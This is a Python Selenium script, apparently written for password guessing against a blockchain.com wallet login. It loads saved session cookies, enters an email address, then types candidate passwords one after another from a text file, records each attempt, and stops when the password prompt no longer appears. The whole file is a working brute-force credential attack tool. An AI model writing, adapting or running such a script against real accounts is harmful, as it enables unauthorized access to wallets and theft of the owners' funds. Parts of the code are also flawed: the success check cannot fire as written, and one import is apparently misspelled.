import pickle
import time

from generat import generate
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys


def save_cookie(driver, path):
    with open(path, 'wb') as filehandler:
        pickle.dump(driver.get_cookies(), filehandler)


def load_cookie(driver, path):
     with open(path, 'rb') as cookiesfile:
         cookies = pickle.load(cookiesfile)
         for cookie in cookies:
             print(cookie)
             driver.add_cookie(cookie)


options = webdriver.ChromeOptions()
options.add_argument("--window-size=1920x1080")
options.add_argument("--verbose")
userAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"
options.add_argument(f'user-agent={userAgent}')


browser = webdriver.Chrome(options=options, executable_path="/opt/homebrew/bin/chromedriver")

# browser.get("https://login.blockchain.com/")
browser.get("https://login.blockchain.com/deeplink/#/login/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
load_cookie(browser, 'cookies.pkl')

elem = browser.find_element(By.TAG_NAME, 'input')  # Find the search box
elem.send_keys('xxxxxx@yandex.ru' + Keys.RETURN)

print('sleep')
time.sleep(30)
print('start')

with open("passwords.txt", "r+") as f:
    new_pass = [line.rstrip() for line in f]
    print('new pass:', len(new_pass))

with open("passwords-ready.txt", "r+") as f:
    old_pass = [line.rstrip() for line in f]
    print('old pass:', len(old_pass))

diff_list = list(set(new_pass) - set(old_pass))
print('diff pass:', len(diff_list))

for comb_str in diff_list:

    print(comb_str)

    elem.clear()
    elem.send_keys(comb_str + Keys.RETURN)

    time.sleep(2)

    header = browser.find_element(By.XPATH, "//*[contains(text(), 'Enter your password')]")
    # print(header.text)

    # header.clear()
    # header.(comb_str)

    with open("passwords-ready2.txt", 'a') as fr:
        fr.write(comb_str + '\n')

    if not header:
        print('!!!!!!!')
        print(comb_str)
        break


foo = input()
save_cookie(browser, 'cookies.pkl')

browser.quit()
